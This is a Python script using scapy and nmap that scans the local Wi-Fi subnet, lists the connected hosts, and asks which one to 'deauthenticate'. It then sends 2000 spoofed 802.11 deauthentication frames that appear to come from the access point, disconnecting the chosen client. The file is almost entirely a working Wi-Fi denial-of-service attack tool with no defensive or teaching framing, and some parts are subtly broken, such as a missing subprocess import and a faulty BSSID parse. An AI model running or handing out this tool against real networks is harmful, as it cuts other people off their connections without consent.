import nmap
from scapy.all import *
import StringIO
from subprocess import check_output
from deauth_classes_module import WirelessLocalAreaNetwork, EligibleHost

def get_iface():
    routing_table = StringIO.StringIO(conf.route)
    for line in routing_table:
        split_line = line.split()
        if split_line[0] == '0.0.0.0':
            iface = split_line[3]
            return iface

def get_bssid(iface):
    pipe = subprocess.Popen(['iwconfig', iface], stdout = subprocess.PIPE)
    for line in pipe.stdout:
        if 'Mode:' in line:
            split_line = line.split()
            bssid = split_line[-1]
    pipe.stdout.close()
    return bssid


def get_network_id():
    routing_table = StringIO.StringIO(conf.route)
    for line in routing_table:
        split_line = line.split()
        if split_line[0] == '0.0.0.0':
            ap_ip = split_line[2]
            network_id_raw = ap_ip.split('.')
            network_id = network_id_raw[0] + '.' + network_id_raw[1] + '.' + network_id_raw[2] + '.0/24'
    return network_id

def get_ap_ip():
    routing_table = StringIO.StringIO(conf.route)
    for line in routing_table:
        split_line = line.split()
        if split_line[0] == '0.0.0.0':
            ap_ip = split_line[2]
            return ap_ip

def get_local_ip():
    routing_table = StringIO.StringIO(conf.route)
    for line in routing_table:
        split_line = line.split()
        if split_line[0] == '0.0.0.0':
            local_ip = split_line[4]
            return local_ip


def get_elible_hosts(nm_scan, local_ip, ap_ip):
    eligible_hosts = []
    for key, value in nm_scan['scan'].iteritems():
        if 'mac' in value['addresses']:
            mac_address = value['addresses']['mac']
        else:
            mac_address = '--:--:--:--:--:--'
        host_name = value['hostname']
        ip_address = value['addresses']['ipv4']
        if ip_address != local_ip and ip_address != ap_ip:
            eh = EligibleHost(host_name, ip_address, mac_address)
            eligible_hosts.append(eh)

    return eligible_hosts

def enable_monitor_mode(iface):
    subprocess.call('ifconfig ' + iface + ' down', shell=True)
    subprocess.call('iwconfig ' + iface + ' mode Monitor', shell=True)
    subprocess.call('ifconfig ' + iface + ' up', shell=True)

def ask_user():
    user_choice = input('Who you would like to deauthenticate? ')
    return user_choice

def deauthenticate_client(user_choice, eligible_hosts, bssid):

    client_to_deauth = eligible_hosts[user_choice].mac_address

    client_to_deauth = client_to_deauth.encode('ascii', 'ignore')

    packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client_to_deauth,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
    for n in range(2000):
        sendp(packet)








def main():

    iface = get_iface()
    
    bssid = get_bssid(iface)

    network_id = get_network_id()
    nm = nmap.PortScanner()
    nm_scan = nm.scan(hosts = network_id, arguments='-sP')

    WirelessLAN = WirelessLocalAreaNetwork(network_id, bssid, get_elible_hosts(nm_scan, get_local_ip(), get_ap_ip()))


    # enable_monitor_mode(get_iface())


    WirelessLAN.display_eligible_hosts()

    user_choice = ask_user()


    deauthenticate_client(user_choice, WirelessLAN.eligible_hosts, bssid)


if __name__ == "__main__":
    main()
